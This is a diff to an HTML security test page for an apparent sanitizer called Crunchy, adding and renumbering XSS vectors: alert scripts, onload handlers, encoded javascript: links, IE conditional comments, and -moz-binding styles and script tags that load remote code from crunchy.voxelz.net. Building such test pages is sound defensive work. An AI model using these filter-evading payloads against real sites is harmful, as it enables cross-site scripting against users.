@@ -1,5 +1,7 @@
 <html>
 <head>
+<!-- Security Test #1a -->
+<link href="security.css" rel="stylesheet" type="text/css" />
 <title>Crunchy Security Test</title>
 <script>
 // Many of these security tests have been taken from http://ha.ckers.org/xss.html
@@ -10,6 +12,19 @@ function security_breach(){
 // Security Test #1
 alert("this is security breach #1");
 </script>
+<!-- Security Test #12 -->
+<!--[if gte IE 4]>
+<SCRIPT>alert('security breach #12');</SCRIPT>
+<![endif]-->
+
+<!-- Security Test #13 -->
+<STYLE type="text/css">BODY{-moz-binding:	url(" http://crunchy.voxelz.net/xssmoz.xml#xss")}</STYLE>
+
+<!-- Security Test #14 with tab between url and (-->
+<STYLE type="text/css">BODY{-moz-binding:url	(" http://crunchy.voxelz.net/xssmoz.xml#xss")}</STYLE>
+
+<!-- Security Test #15 -->
+<SCRIPT/SRC="http://crunchy.voxelz.net/xss.js"></SCRIPT>
 </head>
 
 <!-- Security Test #2 -->
@@ -19,7 +34,9 @@ alert("this is security breach #1");
 <body onload="alert('security breach #3')">
 
 <h1>The Crunchy Security tests</h1>
-<p>No javascript should survive on this page from the original document.  If some did, you should have seen some "alerts" appearing, or you should see an active link below that will trigger an alert.</p>
+<p>No javascript should survive on this page from the original document.  If some did, you should 
+have seen some "alerts" appearing, or you should see an active link below that will 
+trigger an alert.</p>
 
 <!-- Security Test #4 -->
 <script>document.write("security breach #4")</script>
@@ -46,16 +63,8 @@ cript:alert(&quot;security breach #6&quot;)">Security Test #6</a><br>
 <!-- Security Test #11 -->
 <a href="&#106;Avascript:alert('security_breach_11')">Security Test #11</a><br>
 
-<!-- Security Test #12 -->
-<!--[if gte IE 4]>
-<SCRIPT>alert('security breach #12');</SCRIPT>
-<![endif]-->
-
-<!-- Security Test #13 -->
-<STYLE>BODY{-moz-binding:	url(" http://crunchy.voxelz.net/xssmoz.xml#xss")}</STYLE>
-
-<!-- Security Test #14 -->
-<SCRIPT/SRC="http://crunchy.voxelz.net/xss.js"></SCRIPT>
+<!-- Security Test #16 -->
+<p style='-moz-binding:url("http://crunchy.voxelz.net/xssmoz.xml#xss")'>Security test 16</p>
 
 <h2>Bugs</h2>
 <ul>
